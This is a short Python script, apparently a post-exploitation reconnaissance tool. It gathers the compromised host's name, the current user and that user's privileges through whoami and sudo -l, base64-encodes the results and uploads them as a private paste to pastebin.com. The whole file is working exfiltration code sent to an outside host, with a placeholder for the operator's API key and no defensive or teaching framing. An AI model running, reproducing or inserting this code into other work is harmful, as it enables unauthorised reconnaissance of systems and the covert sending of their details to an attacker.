import os
import subprocess
import requests
import base64

hostname = ""
username = ""
privilege = ""
credentials = ""

def getinfo():
    global hostname, username, privilege
    print("Getting agent hostname, username, and privilege...")
    getHostName = subprocess.Popen("hostname", stdin = subprocess.PIPE,
    stdout = subprocess.PIPE,stderr = subprocess.PIPE)
    output, error = getHostName.communicate()
    if output == '':
        print(error)
    else:
        hostname = output.decode();
    
    getUserName = subprocess.Popen("whoami", stdin = subprocess.PIPE,
    stdout = subprocess.PIPE,stderr = subprocess.PIPE)
    output, error = getUserName.communicate()
    if output == '':
        print(error)
    else:
        username = output.decode();
        
    if os.name == 'nt':
        getPrivilege = subprocess.Popen("whoami /priv", stdin = subprocess.PIPE,
        stdout = subprocess.PIPE,stderr = subprocess.PIPE)
        output, error = getPrivilege.communicate()
        if output == '':
            print(error)
        else:
            privilege = output.decode();
    else:
        getPrivilege = subprocess.Popen("sudo -l", stdin = subprocess.PIPE,
        stdout = subprocess.PIPE,stderr = subprocess.PIPE, shell=True)
        output, error = getPrivilege.communicate()
        if output == '':
            print(error)
        else:
            privilege = output.decode();

def uploadPasteBin(hostname,username,privileges):
    credentials = "Hostname : " + hostname + "\n"
    credentials += "Username : " + username + "\n"
    credentials += "Privileges : " + privileges + "\n"
    credentialsByte = credentials.encode("ascii")
    contentbase64Byte = base64.b64encode(credentialsByte)
    contentbase64 = contentbase64Byte.decode("ascii")
    devKey = '' #Masukkan API Dev key masing masing
    option = 'paste'
    paste_code = contentbase64
    paste_private = 1
    paste_name = 'host-reconn'
    paste_expire_data = 'N'
    paste_format = 'text'
    
    content = {'api_dev_key':devKey,
                'api_user_key':"",
                'api_option':option,
                'api_paste_code':paste_code,
                'api_paste_private':paste_private,
                'api_paste_name':paste_name,
                'api_paste_expire_data':paste_expire_data,
                'api_paste_format':paste_format}
    
    pasteBin = requests.post("https://pastebin.com/api/api_post.php",content)
    
    urlResult = pasteBin.text
    print(f'Host Reconnaissance result: {urlResult}')

def main():
    getinfo()
    uploadPasteBin(hostname,username,privilege)

if __name__ == '__main__':
    main()
